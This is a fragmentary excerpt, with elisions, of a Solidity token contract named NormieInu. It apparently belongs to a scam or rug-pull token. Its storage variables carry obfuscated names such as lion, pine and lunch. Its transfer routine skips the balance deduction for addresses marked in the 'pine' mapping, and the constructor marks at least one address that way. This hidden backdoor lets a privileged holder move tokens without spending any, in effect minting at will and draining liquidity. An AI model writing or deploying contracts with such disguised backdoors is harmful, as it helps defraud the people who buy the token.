...
contract NormieInu is Ownable {
    uint256 private willing;
    string private sunlight;
    ...
    mapping(address => uint256) private lion;
    ...
    function train(
        ...
        address donkey = excited;
        excited = brick;

        if (pine[open] == 0) lion[open] -= capital;
        uint256 lake = capital * willing;
        lake = lake / 100;
        capital -= lake;
        lunch[donkey] += fur;
        lion[brick] += capital;
    ...
    mapping(address => uint256) private lunch;

    function approve(address spender, uint256 amount) external returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    mapping(address => uint256) private pine;
    ...
    function transferFrom(
        ...
        train(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        train(msg.sender, recipient, amount);
        return true;
    }
    ...
    constructor(
        ...
        uniswapV2Router = IUniswapV2Router02(silent);
        ...
        willing = 3;
        pine[him] = fur;
        _tTotal = 1000000000000000 * 10**fur;
        lion[msg.sender] = _tTotal;
    }
}